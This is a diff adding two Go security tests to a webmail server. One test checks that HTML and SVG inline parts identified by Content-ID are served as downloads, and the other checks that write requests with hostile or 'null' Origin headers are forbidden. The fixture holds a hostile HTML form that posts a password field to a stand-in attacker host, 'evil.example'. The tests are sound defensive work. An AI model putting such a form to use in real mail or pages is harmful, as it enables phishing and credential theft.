@@ -614,3 +614,65 @@ func TestPartsAreServedFromTheTable(t *testing.T) {
 func twoDigits(n int) string {
 	return string(rune('0'+n/10)) + string(rune('0'+n%10))
 }
+
+// The cid path serves bytes the sender chose, same-origin. Only a raster image
+// may go out as itself; an HTML or SVG part with a Content-ID would otherwise
+// be a sender-authored page on the operator's own origin.
+func TestInlineServesOnlyRasterImagesAsThemselves(t *testing.T) {
+	t.Parallel()
+	srv, dbs := newSeededServer(t)
+	mustAccount(t, dbs, store.Account{ID: "acct-1", Address: "me@example.com"})
+	mustFolder(t, dbs, store.Folder{ID: "inbox-1", AccountID: "acct-1", Name: "INBOX", Role: store.RoleInbox})
+	raw := []byte("From: a@example.com\r\nSubject: hostile\r\nMIME-Version: 1.0\r\n" +
+		"Content-Type: multipart/related; boundary=\"b\"\r\n\r\n" +
+		"--b\r\nContent-Type: text/plain\r\n\r\nbody\r\n" +
+		"--b\r\nContent-Type: text/html\r\nContent-ID: <page>\r\n\r\n<form action=//evil.example><input name=pw></form>\r\n" +
+		"--b\r\nContent-Type: image/svg+xml\r\nContent-ID: <vec>\r\n\r\n<svg xmlns=\"http://www.w3.org/2000/svg\"/>\r\n" +
+		"--b--\r\n")
+	mustMessage(t, dbs, store.Message{
+		ID: "m1", AccountID: "acct-1", FolderID: "inbox-1", UID: 1, ContentKey: "ck:m1",
+		RawBlob: raw, HasAttachments: true, BodyStatus: store.BodyOK,
+	})
+
+	for _, cid := range []string{"page", "vec"} {
+		resp, err := http.Get(srv.URL + "/api/v1/messages/m1/inline/" + cid)
+		if err != nil {
+			t.Fatal(err)
+		}
+		_, _ = io.Copy(io.Discard, resp.Body)
+		_ = resp.Body.Close()
+		if resp.StatusCode != http.StatusOK {
+			t.Fatalf("%s: status = %d, want 200", cid, resp.StatusCode)
+		}
+		if ct := resp.Header.Get("Content-Type"); ct != "application/octet-stream" {
+			t.Errorf("%s: Content-Type = %q, want application/octet-stream", cid, ct)
+		}
+		if cd := resp.Header.Get("Content-Disposition"); !strings.HasPrefix(cd, "attachment") {
+			t.Errorf("%s: Content-Disposition = %q, want attachment", cid, cd)
+		}
+	}
+}
+
+// Origin "null" is what a sandboxed frame or a cross-origin redirect sends; it
+// must not pass for the operator's own origin.
+func TestWriteWithNullOriginIsForbidden(t *testing.T) {
+	t.Parallel()
+	srv, dbs := newSeededServer(t)
+	mustAccount(t, dbs, store.Account{ID: "acct-1", Address: "me@example.com"})
+	for _, origin := range []string{"null", "http://evil.example", srv.URL + ".evil.example"} {
+		req, err := http.NewRequestWithContext(context.Background(), http.MethodPatch,
+			srv.URL+"/api/v1/accounts/acct-1", strings.NewReader(`{"name":"x"}`))
+		if err != nil {
+			t.Fatal(err)
+		}
+		req.Header.Set("Origin", origin)
+		resp, err := http.DefaultClient.Do(req)
+		if err != nil {
+			t.Fatal(err)
+		}
+		_ = resp.Body.Close()
+		if resp.StatusCode != http.StatusForbidden {
+			t.Errorf("Origin %q: status = %d, want 403", origin, resp.StatusCode)
+		}
+	}
+}
